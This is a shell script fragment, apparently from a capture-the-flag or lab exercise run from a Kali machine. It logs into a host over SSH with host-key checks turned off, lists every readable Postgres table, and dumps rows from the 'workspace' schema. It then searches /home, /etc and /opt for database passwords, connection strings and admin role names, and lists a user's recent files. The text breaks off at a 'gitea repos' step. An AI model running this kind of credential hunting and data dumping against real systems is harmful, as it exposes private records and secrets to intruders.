S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
$S 'bash -s' <<'RSH'
set +e
P="psql service=fieldlink -At -F|"
echo "=== all tables + access"
$P -c "select n.nspname,t.relname,has_table_privilege(current_user,c.oid,'SELECT') as sel from pg_class c join pg_namespace n on n.oid=c.relnamespace where c.relkind in ('r','v','m','p') and n.nspname not in ('pg_catalog','information_schema') order by 1,2;"
echo "=== workspace schema"
$P -c "select table_schema,table_name,column_name,data_type from information_schema.columns where table_schema='workspace' order by table_name,ordinal_position;"
for t in $($P -c "select table_name from information_schema.tables where table_schema='workspace'"); do echo "--- $t"; $P -c "select * from workspace.$t limit 20" 2>&1 | head -20; done
echo "=== cron/systemd/env hints"
grep -rilE "fieldlink_admin|fieldlink_data_owner|PGPASSWORD|postgres://|psql service" /home/rowan /etc /opt 2>/dev/null | grep -v -E "\.cache/|\.npm/|node_modules|\.git/" | head -20
echo "=== home file listing"
find /home/rowan -maxdepth 2 -type f -newermt 2026-11-18 ! -path '*/.cache/*' ! -path '*/.npm/*' 2>/dev/null | head -60
RSH
echo "=== gitea repos"
CA=/home/kali/ctf/../../home/kali/ctf/ca.crt
